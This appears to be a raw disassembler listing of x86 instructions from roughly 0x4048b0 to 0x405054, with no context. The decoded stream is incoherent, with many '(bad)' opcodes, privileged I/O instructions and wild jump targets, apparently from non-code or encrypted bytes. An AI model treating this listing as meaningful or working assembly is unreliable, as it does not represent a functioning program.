  4048b0:	xchg   ecx,eax
  4048b1:	std    
  4048b2:	jo     0x404924
  4048b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b5:	imul   ebx,eax,0x2e46ea8b
  4048bb:	fsubr  DWORD PTR es:[ecx-0x1d]
  4048bf:	dec    ebp
  4048c0:	pusha  
  4048c1:	aaa    
  4048c2:	jno    0x4048d3
  4048c4:	sub    bl,BYTE PTR [ecx+edi*8-0x780390cc]
  4048cb:	and    al,0x9d
  4048cd:	dec    edx
  4048ce:	popa   
  4048cf:	mov    dl,0x10
  4048d1:	les    ebp,FWORD PTR [edx]
  4048d3:	test   eax,0xb1a80611
  4048d8:	pop    ss
  4048d9:	xlat   BYTE PTR ds:[ebx]
  4048da:	jmp    0x33791ed8
  4048df:	scas   al,BYTE PTR es:[edi]
  4048e0:	jb     0x4048d5
  4048e2:	jmp    0x404944
  4048e4:	add    al,0xc9
  4048e6:	(bad)  
  4048e8:	(bad)  
  4048ea:	gs xchg dl,al
  4048ed:	js     0x4048ff
  4048ef:	mov    dl,0x2b
  4048f1:	pop    esi
  4048f2:	mov    esi,0xcefbd275
  4048f7:	inc    ebp
  4048f8:	mov    esi,0xd135f4d1
  4048fd:	mov    edx,0xb39c953d
  404902:	fild   QWORD PTR [ecx+eax*1-0x4c]
  404906:	addr16 test eax,0x63c7ebfc
  40490c:	xchg   ebp,eax
  40490d:	push   ecx
  40490e:	xor    BYTE PTR [ecx],cl
  404910:	xlat   BYTE PTR ds:[ebx]
  404911:	es dec esp
  404913:	and    bh,BYTE PTR [ebx+0x58]
  404916:	adc    DWORD PTR [ebx+0x1c400587],esp
  40491c:	push   0x3f
  40491e:	out    dx,al
  40491f:	sahf   
  404920:	fdiv   DWORD PTR [edx+0x53af26c1]
  404926:	enter  0x92e8,0x42
  40492a:	xor    DWORD PTR [eax],0xd497fe10
  404930:	retf   
  404931:	stc    
  404932:	inc    dl
  404934:	imul   DWORD PTR [edi+0x2906b223]
  40493a:	xor    eax,0x1ce5c109
  40493f:	lods   eax,DWORD PTR ds:[esi]
  404940:	pop    es
  404941:	(bad)  
  404942:	pop    edi
  404943:	out    0x62,eax
  404945:	mov    eax,DWORD PTR [ecx]
  404947:	sub    eax,0x352756e2
  40494c:	pop    ds
  40494d:	(bad)  
  40494f:	xor    eax,0x1d126301
  404954:	(bad)  
  404955:	in     eax,dx
  404956:	sbb    DWORD PTR [ebp-0x7b],ebp
  404959:	js     0x404995
  40495b:	scas   eax,DWORD PTR es:[edi]
  40495c:	and    DWORD PTR [esi+eax*8-0x4b],ecx
  404960:	mov    edi,edi
  404962:	push   ss
  404963:	in     al,0x7a
  404965:	mov    DWORD PTR [edi-0x3bc196df],edi
  40496b:	sub    DWORD PTR [ebx],edi
  40496d:	rcl    DWORD PTR [eax+0xd77bb1b],cl
  404973:	or     DWORD PTR ds:0x2b762781,esp
  404979:	or     al,0x1f
  40497b:	(bad)  
  40497d:	inc    edi
  40497e:	lods   al,BYTE PTR ds:[esi]
  40497f:	jno    0x404903
  404981:	in     eax,dx
  404982:	jmp    0xe633295
  404987:	hlt    
  404988:	lods   eax,DWORD PTR ds:[esi]
  404989:	mov    BYTE PTR [ecx],0xd
  40498c:	inc    esi
  40498d:	xor    DWORD PTR [edi+0x108fb0ad],eax
  404993:	add    esp,DWORD PTR [edi+eiz*8-0x13312f3f]
  40499a:	data16 jge 0x404978
  40499d:	lds    ecx,FWORD PTR [ecx-0x59]
  4049a0:	aas    
  4049a1:	cmc    
  4049a2:	jne    0x40499d
  4049a4:	clc    
  4049a5:	loopne 0x40499d
  4049a7:	mov    eax,ds:0x8157e24
  4049ac:	fst    QWORD PTR [edi+0x55]
  4049af:	mov    bl,0x47
  4049b1:	(bad)  
  4049b2:	addr16 aaa 
  4049b4:	dec    ebx
  4049b5:	shl    DWORD PTR [eax+0x3a],0xd0
  4049b9:	xor    eax,0xe89eba10
  4049be:	inc    edx
  4049bf:	mov    esp,0x2e4afdc2
  4049c4:	mov    ch,0xcb
  4049c6:	fimul  WORD PTR [ebx+0x65]
  4049c9:	push   ebp
  4049ca:	sub    al,0x89
  4049cc:	cwde   
  4049cd:	(bad)  
  4049ce:	pushf  
  4049cf:	loope  0x404a24
  4049d1:	lds    esi,FWORD PTR ds:[edi]
  4049d4:	pop    ebx
  4049d5:	fcom   QWORD PTR [esi+0x1c]
  4049d8:	lds    ecx,FWORD PTR [esi+0x7e]
  4049db:	dec    ebp
  4049dc:	ja     0x40499a
  4049de:	lods   al,BYTE PTR ds:[esi]
  4049df:	(bad)  
  4049e1:	arpl   di,si
  4049e3:	xchg   edi,eax
  4049e4:	sti    
  4049e5:	loope  0x4049f5
  4049e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e8:	mov    ebx,0xe31be421
  4049ed:	mov    dh,0xcd
  4049ef:	pushf  
  4049f0:	int    0x5
  4049f2:	mov    eax,0x9e5ca040
  4049f7:	fld    st(4)
  4049f9:	pushaw 
  4049fb:	xchg   ebx,eax
  4049fc:	push   ecx
  4049fd:	inc    edx
  4049fe:	outs   dx,BYTE PTR ds:[esi]
  4049ff:	aaa    
  404a00:	(bad)  
  404a01:	and    DWORD PTR [ebx+0x5b367e3a],ecx
  404a07:	aam    0x8
  404a09:	addr16 shl ah,1
  404a0c:	mov    dh,0xc0
  404a0e:	xchg   ebp,eax
  404a0f:	pop    ebx
  404a10:	or     al,0x7e
  404a12:	cmp    dl,0x92
  404a15:	and    BYTE PTR [edx-0xd15f27b],0xe5
  404a1c:	shr    BYTE PTR [ebp-0x5],cl
  404a1f:	jo     0x404a3a
  404a21:	and    esi,DWORD PTR [ecx+eiz*4+0x59]
  404a25:	aas    
  404a26:	dec    eax
  404a27:	repz fst DWORD PTR [ecx]
  404a2a:	test   BYTE PTR [ebx-0x6d],dh
  404a2d:	loope  0x404a3b
  404a2f:	pop    esp
  404a30:	push   es
  404a31:	sub    dl,BYTE PTR [edx+0x3934c508]
  404a37:	push   edx
  404a38:	pusha  
  404a39:	fisttp QWORD PTR [ebx-0x5c]
  404a3c:	nop
  404a3d:	sbb    BYTE PTR [edx+0x12],0xc4
  404a41:	leave  
  404a42:	std    
  404a43:	add    DWORD PTR [esi],0xffffffab
  404a46:	sbb    BYTE PTR [ecx+esi*1+0x2cc86566],cl
  404a4d:	dec    edi
  404a4e:	sub    dl,BYTE PTR [eax]
  404a50:	pop    ecx
  404a51:	cmc    
  404a52:	pop    ecx
  404a53:	leave  
  404a54:	popa   
  404a55:	icebp  
  404a56:	xchg   esi,eax
  404a57:	retf   
  404a58:	cmp    bl,bl
  404a5a:	sub    DWORD PTR [edx+eiz*4+0x64],edi
  404a5e:	push   ebx
  404a5f:	mov    al,ds:0x2c2bfb17
  404a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a65:	pusha  
  404a66:	and    ecx,DWORD PTR [edx-0x3b]
  404a69:	inc    esp
  404a6a:	xchg   ebp,eax
  404a6b:	and    edi,DWORD PTR [ebx]
  404a6d:	mov    esp,0x327d7eac
  404a72:	mov    esi,ebx
  404a74:	(bad)  
  404a75:	(bad)  [eax+0x4f]
  404a78:	xor    eax,DWORD PTR ds:0x38c0432f
  404a7e:	stos   BYTE PTR es:[edi],al
  404a7f:	aam    0x80
  404a81:	retf   0x90d4
  404a84:	pusha  
  404a85:	rol    DWORD PTR ds:0xcc1dec98,cl
  404a8b:	lds    ebx,FWORD PTR [ebp+0x11]
  404a8e:	stos   BYTE PTR es:[edi],al
  404a8f:	jae    0x404a79
  404a91:	add    eax,0xe17ca1a
  404a96:	and    al,BYTE PTR [edx-0x67f5d6bc]
  404a9c:	aad    0xb8
  404a9e:	cmp    bh,ah
  404aa0:	mov    bl,0xe1
  404aa2:	cmp    BYTE PTR [ebp+0x19],0xad
  404aa6:	add    esi,DWORD PTR [esi]
  404aa8:	cs inc ecx
  404aaa:	or     eax,0x6af12c2c
  404aaf:	pusha  
  404ab0:	mov    bl,cl
  404ab2:	sbb    al,0x7e
  404ab4:	sub    al,ch
  404ab6:	and    eax,0xf9d23db2
  404abb:	adc    DWORD PTR [ebx-0x5fc5bf19],esi
  404ac1:	pop    eax
  404ac2:	or     BYTE PTR [esi],bh
  404ac4:	dec    esp
  404ac5:	adc    bh,BYTE PTR [ebx+0x7]
  404ac8:	mov    bh,0x78
  404aca:	ds mov ebp,0x939d7e9c
  404ad0:	(bad)  
  404ad1:	(bad)  
  404ad2:	jne    0x404b3b
  404ad4:	lods   eax,DWORD PTR ds:[esi]
  404ad5:	iret   
  404ad6:	sub    eax,0x802b9dee
  404adb:	cmp    eax,0x74c686b9
  404ae0:	jns    0x404b32
  404ae2:	cmp    al,0x2a
  404ae4:	adc    al,ch
  404ae6:	push   esp
  404ae7:	dec    esp
  404ae8:	shr    BYTE PTR [esi+ecx*8+0x13a0bb83],0xbb
  404af0:	fidivr DWORD PTR [edi+0x2e59c8ab]
  404af6:	aas    
  404af7:	enter  0xe2e7,0x35
  404afb:	or     al,0xa
  404afd:	dec    esp
  404afe:	lods   eax,DWORD PTR ds:[esi]
  404aff:	push   0xffffffa5
  404b01:	ror    BYTE PTR [esi-0x4e],cl
  404b04:	es mov dh,0x12
  404b07:	jb     0x404ab4
  404b09:	xchg   ebp,eax
  404b0a:	(bad)  
  404b0b:	mov    eax,0xbd8fe652
  404b10:	or     bh,bh
  404b12:	int    0x34
  404b14:	iret   
  404b15:	fistp  QWORD PTR [ecx+ebp*2+0x39d73e79]
  404b1c:	xchg   ecx,eax
  404b1d:	mov    edx,DWORD PTR [edx+0x70]
  404b20:	adc    BYTE PTR [esi-0x17],dl
  404b23:	sbb    edx,ebp
  404b25:	cmp    ebp,eax
  404b27:	add    al,al
  404b29:	jmp    0x404b97
  404b2b:	bound  ecx,QWORD PTR [edi+0x183f0db2]
  404b31:	(bad)  
  404b32:	and    DWORD PTR [esi-0x57f75a2a],ebx
  404b38:	sbb    BYTE PTR [edx],dl
  404b3a:	adc    al,0xab
  404b3c:	dec    ebp
  404b3d:	push   ecx
  404b3e:	scas   eax,DWORD PTR es:[edi]
  404b3f:	cli    
  404b40:	push   eax
  404b41:	mov    ds:0xed838019,al
  404b46:	push   eax
  404b47:	push   eax
  404b48:	mov    dl,0xe5
  404b4a:	out    0x4b,al
  404b4c:	hlt    
  404b4d:	retf   0x4021
  404b50:	test   eax,0x3b2f9666
  404b55:	xor    eax,0xd63cdf3b
  404b5a:	xchg   edi,eax
  404b5b:	pop    ebx
  404b5c:	(bad)  
  404b5e:	push   ecx
  404b5f:	call   0xcd1b:0x5a75a38c
  404b66:	sub    DWORD PTR [eax-0xc1589d6],edx
  404b6c:	sbb    al,0xc8
  404b6e:	add    dh,bl
  404b70:	lahf   
  404b71:	(bad)  
  404b72:	popf   
  404b73:	cld    
  404b74:	repnz inc ebp
  404b76:	pop    ebp
  404b77:	aad    0x84
  404b79:	mov    bh,0xa2
  404b7b:	sub    esp,DWORD PTR [edi-0x1b]
  404b7e:	dec    eax
  404b7f:	clc    
  404b80:	lahf   
  404b81:	sub    DWORD PTR [edx+ecx*8],esp
  404b84:	arpl   WORD PTR [eax],sp
  404b86:	ror    edx,1
  404b88:	cdq    
  404b89:	dec    ebp
  404b8a:	test   BYTE PTR [ecx+0x567b7fa5],bl
  404b90:	pop    ebx
  404b91:	adc    eax,0xfc0f3709
  404b96:	test   al,0x65
  404b98:	test   al,0xa5
  404b9a:	and    eax,0xe3119bea
  404b9f:	xor    cl,BYTE PTR [eax]
  404ba1:	sub    al,0xc3
  404ba3:	lock leave 
  404ba5:	fisubr DWORD PTR [ebp+0x3323730d]
  404bab:	add    dh,cl
  404bad:	ret    0x2045
  404bb0:	cmp    al,0x2f
  404bb2:	in     al,0x3a
  404bb4:	mov    bh,0x6d
  404bb6:	xchg   esi,eax
  404bb7:	stc    
  404bb8:	test   eax,0x95d143bd
  404bbd:	(bad)  
  404bbf:	or     esp,ebx
  404bc1:	sti    
  404bc2:	or     al,0x5f
  404bc4:	sub    DWORD PTR [esi+0x74],esp
  404bc7:	pop    edx
  404bc8:	scas   eax,DWORD PTR es:[edi]
  404bc9:	and    eax,0xa80b2ac9
  404bce:	loope  0x404ba6
  404bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bd1:	push   ss
  404bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bd3:	mov    DWORD PTR [ebx-0x31a73b7f],ebp
  404bd9:	jnp    0x404bd4
  404bdb:	pop    esi
  404bdc:	and    DWORD PTR [eax-0x3833d27a],ebp
  404be2:	mov    al,ds:0xa6bc11f3
  404be7:	or     ebp,esi
  404be9:	cmp    eax,0x393e9842
  404bee:	jae    0x404bf0
  404bf0:	test   DWORD PTR [eax],0xe5159573
  404bf6:	sbb    BYTE PTR [edi+ecx*8],al
  404bf9:	lds    edx,FWORD PTR ds:[edx+0x4e]
  404bfd:	dec    esi
  404bfe:	rol    BYTE PTR [edi-0x8e56bd2],1
  404c04:	aad    0x9b
  404c06:	mul    BYTE PTR [edi]
  404c08:	popf   
  404c09:	xchg   ecx,eax
  404c0a:	popa   
  404c0b:	sub    eax,DWORD PTR [esi-0x52165e4f]
  404c11:	clc    
  404c12:	jmp    0x1f8ce2bc
  404c17:	lods   al,BYTE PTR ds:[esi]
  404c18:	xchg   ecx,eax
  404c19:	(bad)  
  404c1b:	inc    edx
  404c1c:	mov    esi,0x15cde584
  404c21:	xor    al,dh
  404c23:	mov    esi,fs
  404c25:	inc    ebp
  404c26:	jne    0x404c94
  404c28:	push   ss
  404c29:	outs   dx,BYTE PTR ds:[esi]
  404c2a:	push   ebx
  404c2b:	and    ch,bl
  404c2d:	sub    al,0x4d
  404c2f:	mov    ebx,0x7372978e
  404c34:	popa   
  404c35:	fidiv  DWORD PTR [edx]
  404c37:	sbb    ebx,eax
  404c39:	pop    ebx
  404c3a:	pop    ebp
  404c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c3c:	ja     0x404c75
  404c3e:	jecxz  0x404bc1
  404c40:	lea    ebx,ds:0xb0f75dff
  404c46:	push   esp
  404c47:	and    al,0x1
  404c49:	clc    
  404c4a:	mov    es,WORD PTR [edx]
  404c4c:	jo     0x404c83
  404c4e:	mov    ebx,0x1fdcfcee
  404c53:	shl    DWORD PTR [edi+0x16],1
  404c56:	sub    BYTE PTR cs:[esi+0x26],dh
  404c5a:	stc    
  404c5b:	int3   
  404c5c:	out    0x73,eax
  404c5e:	mov    ds:0x19f3ac33,eax
  404c63:	aam    0x54
  404c65:	(bad)  
  404c66:	outs   dx,DWORD PTR ds:[esi]
  404c67:	or     edi,DWORD PTR [eax+ebp*8+0x453c20d8]
  404c6e:	or     al,0xe1
  404c70:	or     eax,0x539d8ce5
  404c75:	ss jecxz 0x404c34
  404c78:	cwde   
  404c79:	shl    BYTE PTR [ebx+0x6f],1
  404c7c:	push   0xffffff8e
  404c7e:	scas   al,BYTE PTR es:[edi]
  404c7f:	(bad)  
  404c80:	not    BYTE PTR [ebp-0x4711e067]
  404c86:	test   BYTE PTR [ebp-0x5fa04ced],0x4e
  404c8d:	sub    ecx,edx
  404c8f:	setle  cl
  404c92:	pop    esi
  404c93:	xchg   esp,eax
  404c94:	push   0x10
  404c96:	or     dh,BYTE PTR [eax+0x72c12724]
  404c9c:	imul   eax,DWORD PTR [eax+eax*8-0x35],0x7facfae0
  404ca4:	lock push esp
  404ca6:	out    dx,al
  404ca7:	inc    ecx
  404ca8:	aam    0x67
  404caa:	fcom   DWORD PTR [esi+0x64ea41ee]
  404cb0:	pop    esi
  404cb1:	pop    esi
  404cb2:	mov    ds:0xcce5f8e2,eax
  404cb8:	or     DWORD PTR [ecx+0x5b24fe80],esp
  404cbe:	sbb    al,al
  404cc0:	adc    eax,0x6530c01a
  404cc5:	and    bh,bh
  404cc7:	xor    ecx,eax
  404cc9:	ds or  dh,dh
  404ccc:	push   0x200d95c2
  404cd1:	sbb    eax,0x8aff6d25
  404cd6:	jg     0x404cf2
  404cd8:	push   0x41
  404cda:	lds    esi,FWORD PTR [edx-0x68]
  404cdd:	iret   
  404cde:	int    0xb0
  404ce0:	xchg   BYTE PTR ds:0x3f3d369e,ch
  404ce6:	mov    dh,0x36
  404ce8:	xor    al,0xee
  404cea:	(bad)  
  404ceb:	pop    ebp
  404cec:	push   0xffffff8b
  404cee:	hlt    
  404cef:	fbld   TBYTE PTR [eax]
  404cf1:	leave  
  404cf2:	(bad)  
  404cf3:	mov    ebx,0x3b102241
  404cf8:	mov    cs,esi
  404cfa:	xor    eax,0x5ce473b9
  404cff:	jecxz  0x404cc1
  404d01:	shl    BYTE PTR [ebx],0xb8
  404d04:	lea    ebp,[edi]
  404d06:	mov    ecx,0xce830bb7
  404d0b:	or     eax,0x76e23b82
  404d10:	xchg   esp,eax
  404d11:	fst    QWORD PTR [eax+0x15574533]
  404d17:	sahf   
  404d18:	push   ds
  404d19:	push   ss
  404d1a:	mov    edi,0xa173fcc6
  404d1f:	not    DWORD PTR [edx+0x6e]
  404d22:	repz add eax,0xe85cfafe
  404d28:	loopne 0x404cbc
  404d2a:	dec    ecx
  404d2b:	push   0x2082ca1e
  404d30:	adc    al,0x70
  404d33:	xchg   edi,eax
  404d34:	mov    ecx,0x6fed1bf9
  404d39:	jecxz  0x404d7a
  404d3b:	cdq    
  404d3c:	and    bl,ah
  404d3e:	mov    BYTE PTR [ebp+0x5f],bh
  404d41:	ds (bad) 
  404d43:	cwde   
  404d44:	shr    dl,cl
  404d46:	ret    0x8c60
  404d49:	cmp    edi,DWORD PTR [ecx]
  404d4b:	ficom  DWORD PTR ds:0x5669830b
  404d51:	(bad)  
  404d52:	stos   DWORD PTR es:[edi],eax
  404d53:	push   cs
  404d54:	xor    ecx,edx
  404d56:	push   esi
  404d57:	sbb    al,0xd0
  404d59:	and    DWORD PTR [edx-0x43ac876f],0x39
  404d60:	pushf  
  404d61:	jae    0x404d30
  404d63:	arpl   WORD PTR [ecx+0x1e],bx
  404d66:	sbb    dh,BYTE PTR [ecx+0x28]
  404d69:	lahf   
  404d6a:	dec    edx
  404d6b:	mov    ebp,cs
  404d6d:	mov    ebp,0x48a1f7f7
  404d72:	push   bp
  404d74:	pop    eax
  404d75:	bound  edx,QWORD PTR [edx]
  404d77:	xchg   edi,eax
  404d78:	hlt    
  404d79:	das    
  404d7a:	or     BYTE PTR [esi+0x3e],0xa1
  404d7e:	cli    
  404d7f:	sub    al,0xc6
  404d81:	pusha  
  404d82:	push   0x3873de80
  404d87:	jl     0x404d43
  404d89:	mov    al,ds:0x5d11f9bd
  404d8e:	lds    ebx,FWORD PTR [ecx-0x75]
  404d91:	mov    cl,0x75
  404d93:	rcr    DWORD PTR [eax+0x1],1
  404d96:	adc    al,0x5c
  404d98:	and    eax,0x8ccdad5e
  404d9d:	adc    DWORD PTR [ebx-0xec43818],esp
  404da3:	mov    DWORD PTR [ecx+0x40a8b086],ebx
  404da9:	sbb    eax,0x94d42291
  404dae:	xor    BYTE PTR [edx+0x7c],al
  404db1:	fxtract 
  404db3:	sub    al,0x1b
  404db5:	lock loop 0x404d6c
  404db8:	fcmovne st,st(2)
  404dba:	xchg   esp,eax
  404dbb:	lahf   
  404dbc:	cmp    esp,ecx
  404dbe:	dec    esp
  404dbf:	ret    0x7b26
  404dc2:	xchg   edi,eax
  404dc3:	mov    ebp,0x48e5039c
  404dc8:	in     eax,0x69
  404dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dcb:	mov    al,0x13
  404dcd:	call   0x88bc3fe0
  404dd2:	inc    esi
  404dd3:	mov    esi,0xd1094e7a
  404dd8:	icebp  
  404dd9:	xchg   edx,eax
  404dda:	sbb    BYTE PTR [ebx-0xe0224ce],ah
  404de0:	sti    
  404de1:	mov    ah,0x91
  404de3:	push   ebp
  404de4:	loopne 0x404ddf
  404de6:	mov    esi,eax
  404de8:	sub    DWORD PTR [esi],eax
  404dea:	test   BYTE PTR [ecx+0x77],dh
  404ded:	inc    ebx
  404dee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404def:	xor    al,0x31
  404df1:	sbb    eax,0xedddc595
  404df6:	pop    es
  404df7:	mov    esi,0xb769a986
  404dfc:	or     DWORD PTR [esi],esp
  404dfe:	adc    eax,0x3041b0e4
  404e03:	dec    eax
  404e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e05:	and    esi,DWORD PTR [esi]
  404e07:	popf   
  404e08:	mov    BYTE PTR [edi+0x1b],dh
  404e0b:	icebp  
  404e0c:	rcl    esp,0xfb
  404e0f:	fisubr WORD PTR [esi-0x3f4079fa]
  404e15:	adc    esi,DWORD PTR [edi+esi*1+0x7b28597f]
  404e1c:	in     eax,dx
  404e1d:	sub    esi,ebx
  404e1f:	pop    ecx
  404e20:	lock mov ds:0x844822b4,eax
  404e26:	daa    
  404e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e28:	xchg   BYTE PTR [edx],al
  404e2a:	pop    esp
  404e2b:	dec    ecx
  404e2c:	inc    esi
  404e2d:	mov    ecx,0xb240c64b
  404e32:	daa    
  404e33:	xor    ah,BYTE PTR [edx+0x7366ffd1]
  404e39:	fsub   DWORD PTR [edi-0x3f064274]
  404e3f:	retf   0xa9e0
  404e42:	xchg   DWORD PTR [edx+0x18],esi
  404e45:	ins    BYTE PTR es:[edi],dx
  404e46:	push   ebp
  404e47:	jb     0x404ec3
  404e49:	dec    eax
  404e4a:	sub    DWORD PTR [ecx-0x34a0688a],ecx
  404e50:	lods   eax,DWORD PTR ds:[esi]
  404e51:	push   DWORD PTR ds:0xaa7b1709
  404e57:	fsubr  QWORD PTR [esi+0x62]
  404e5a:	aas    
  404e5b:	pop    edx
  404e5c:	jne    0x404e35
  404e5e:	scas   al,BYTE PTR es:[edi]
  404e5f:	retf   0x548d
  404e62:	ins    DWORD PTR es:[edi],dx
  404e63:	sbb    BYTE PTR [esi],dh
  404e65:	pushf  
  404e66:	pop    esi
  404e67:	dec    edx
  404e68:	cmp    BYTE PTR [edx-0x7202c622],dh
  404e6e:	push   edi
  404e6f:	jge    0x404e43
  404e71:	cmp    eax,0x73cc5719
  404e76:	fist   DWORD PTR [eax]
  404e78:	mov    edi,DWORD PTR [edx+edx*8+0x6d532cec]
  404e7f:	sar    BYTE PTR [edx+eiz*4-0x749efa32],0x78
  404e87:	in     al,0x7c
  404e89:	xchg   edi,eax
  404e8a:	shr    DWORD PTR [eax+0x39],0xae
  404e8e:	inc    ebp
  404e8f:	cmc    
  404e90:	into   
  404e91:	(bad)  
  404e92:	sbb    eax,0xfdee7913
  404e97:	push   ebp
  404e98:	in     eax,0x8c
  404e9a:	clc    
  404e9b:	xchg   esp,eax
  404e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9d:	fnsave [edx+0x25]
  404ea0:	add    ah,BYTE PTR [eax-0x76]
  404ea3:	cdq    
  404ea4:	ja     0x404e29
  404ea6:	mov    ebp,0xac17f9f4
  404eab:	mov    dl,0x9e
  404ead:	aad    0x94
  404eaf:	mov    bh,0xfb
  404eb1:	inc    esi
  404eb2:	mov    ds:0x216690fb,al
  404eb7:	jmp    0x404ea8
  404eb9:	lods   al,BYTE PTR ds:[esi]
  404eba:	shl    BYTE PTR [ebx-0x41],1
  404ebd:	add    esi,DWORD PTR [eax+0x4a6e3f80]
  404ec3:	ss add al,0x89
  404ec6:	add    DWORD PTR [esi+0x3b],esp
  404ec9:	xchg   edi,eax
  404eca:	call   0x243d16cd
  404ecf:	jb     0x404e98
  404ed1:	and    esp,DWORD PTR [edi]
  404ed3:	or     eax,eax
  404ed5:	cmc    
  404ed6:	cmp    eax,0xffffffb4
  404ed9:	lds    bp,DWORD PTR [ecx]
  404edc:	scas   eax,DWORD PTR es:[edi]
  404edd:	sbb    edi,eax
  404edf:	rol    DWORD PTR [esi+ebx*1],cl
  404ee2:	jns    0x404f08
  404ee4:	xchg   ecx,eax
  404ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ee6:	stc    
  404ee7:	cmp    dl,BYTE PTR [esi-0x6e019473]
  404eed:	pop    es
  404eee:	cwde   
  404eef:	push   edi
  404ef0:	add    BYTE PTR [edx+0x3],bh
  404ef3:	sbb    DWORD PTR [ecx],edx
  404ef5:	jle    0x404ee6
  404ef7:	and    eax,0x36c581f0
  404efc:	jmp    DWORD PTR [esi+0xa]
  404eff:	repz or eax,ebp
  404f02:	neg    DWORD PTR [ebx+0x50]
  404f05:	out    dx,eax
  404f06:	fiadd  DWORD PTR [ecx+0x587e02b5]
  404f0c:	jl     0x404ef0
  404f0e:	icebp  
  404f0f:	mov    dl,BYTE PTR [eax]
  404f11:	dec    ebx
  404f12:	or     bl,bl
  404f14:	rol    DWORD PTR [eax+edi*1],0x10
  404f18:	mov    ah,0x95
  404f1a:	mov    ah,0xb5
  404f1c:	cld    
  404f1d:	pop    ebp
  404f1e:	aam    0x3c
  404f20:	je     0x404ef1
  404f22:	jle    0x404f2f
  404f24:	pop    ebp
  404f25:	pop    edx
  404f26:	add    BYTE PTR [edx-0x61],bl
  404f29:	fdiv   QWORD PTR fs:[edx+0x34]
  404f2d:	jge    0x404f5e
  404f2f:	ds loopne 0x404f78
  404f32:	bswap  eax
  404f34:	sub    BYTE PTR [esi],0xdb
  404f37:	stos   DWORD PTR es:[edi],eax
  404f38:	ror    DWORD PTR [ebp+0xc958060],0xe
  404f3f:	inc    esi
  404f41:	std    
  404f42:	xchg   DWORD PTR [esi-0x3b4f354f],esp
  404f48:	icebp  
  404f49:	push   ss
  404f4a:	adc    eax,0xd9f89dcb
  404f4f:	cmp    al,0x4b
  404f51:	adc    eax,0x20a2e6c8
  404f56:	icebp  
  404f57:	aam    0xf9
  404f59:	xor    ebx,edx
  404f5b:	(bad)  
  404f5c:	xor    eax,0x1b51d1e9
  404f61:	add    BYTE PTR [esi+0x2de19077],bh
  404f67:	or     eax,0xe32e1b19
  404f6c:	out    dx,al
  404f6d:	and    BYTE PTR gs:[edi+edi*1-0x3],dl
  404f72:	xor    edi,esp
  404f74:	dec    ecx
  404f75:	cmp    eax,0xbf888e54
  404f7a:	bound  eax,QWORD PTR [edx+0x3dc5734c]
  404f80:	lods   al,BYTE PTR ds:[esi]
  404f81:	mov    eax,0x46ea2ec5
  404f86:	push   es
  404f87:	and    eax,0x15eee146
  404f8c:	sar    BYTE PTR [ebx+0x661d9bc4],cl
  404f92:	pusha  
  404f93:	pop    edx
  404f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f95:	xchg   DWORD PTR [esi-0x1a],ebp
  404f98:	adc    BYTE PTR [ebp-0x4332cf6b],0xcd
  404f9f:	clc    
  404fa0:	cmp    esi,DWORD PTR [edx]
  404fa2:	lahf   
  404fa3:	push   cs
  404fa4:	pusha  
  404fa5:	or     BYTE PTR [esi],dl
  404fa7:	cmp    ebp,DWORD PTR [esi+0xc]
  404faa:	jnp    0x404fc1
  404fac:	arpl   WORD PTR [esi],dx
  404fae:	xor    ch,BYTE PTR [ebx+esi*2+0x6d99bdf5]
  404fb5:	or     eax,0x2c85b70b
  404fba:	jg     0x404ffc
  404fbc:	dec    ebp
  404fbd:	cmc    
  404fbe:	xchg   BYTE PTR [esi],dh
  404fc0:	ret    
  404fc1:	sub    al,0x20
  404fc3:	inc    edx
  404fc4:	jb     0x40503c
  404fc6:	mov    dl,0xd0
  404fc8:	jae    0x404f7e
  404fca:	jnp    0x404f84
  404fcc:	cmp    eax,0xc2f89756
  404fd1:	xlat   BYTE PTR ds:[ebx]
  404fd2:	sub    esi,ebx
  404fd4:	xchg   edi,eax
  404fd5:	loop   0x404fa3
  404fd7:	shl    cl,1
  404fd9:	iret   
  404fda:	inc    edx
  404fdb:	and    eax,0x7175487d
  404fe0:	popf   
  404fe1:	xchg   ebx,eax
  404fe2:	xchg   ebx,eax
  404fe3:	sub    ch,al
  404fe5:	cli    
  404fe6:	scas   eax,DWORD PTR es:[edi]
  404fe7:	inc    esi
  404fe8:	adc    al,0xc2
  404fea:	enter  0xaea8,0x45
  404fee:	and    ebx,DWORD PTR [ebp+0x0]
  404ff1:	test   al,0xd5
  404ff3:	jbe    0x404f77
  404ff5:	ror    bl,0xf2
  404ff8:	sti    
  404ff9:	es cmp eax,0xfe106742
  404fff:	mov    WORD PTR [eax+0x69],es
  405002:	and    ah,BYTE PTR [ebp+0x1d]
  405005:	stos   BYTE PTR es:[edi],al
  405006:	(bad)  
  405007:	(bad)  
  405008:	adc    edx,DWORD PTR [eax-0x73]
  40500b:	aaa    
  40500c:	retf   0x813d
  40500f:	ret    0x2104
  405012:	arpl   WORD PTR [eax],ax
  405014:	into   
  405015:	inc    eax
  405016:	sbb    edi,DWORD PTR [eax+0x3a147c91]
  40501c:	push   esi
  40501d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40501e:	das    
  40501f:	popf   
  405020:	ss mov cl,0xd4
  405023:	push   ebp
  405024:	repnz fmul st,st(4)
  405027:	rcl    BYTE PTR [ebp+0x376e8744],1
  40502d:	and    ah,bh
  40502f:	out    0x3a,al
  405031:	jnp    0x40505c
  405033:	push   0x36
  405035:	test   BYTE PTR [eax],dl
  405037:	mov    BYTE PTR [esi-0x3d],dh
  40503a:	sbb    edx,DWORD PTR [edi*4+0x741ff41a]
  405041:	repnz or BYTE PTR ds:0x6634a33f,dl
  405048:	(bad)  
  405049:	sbb    eax,0x6bde736c
  40504e:	test   DWORD PTR [eax+eiz*1+0x37],edx
  405052:	cmp    al,0xf6
  405054:	imul   ecx,DWORD PTR [esi+esi*1],0x22f4cfb7
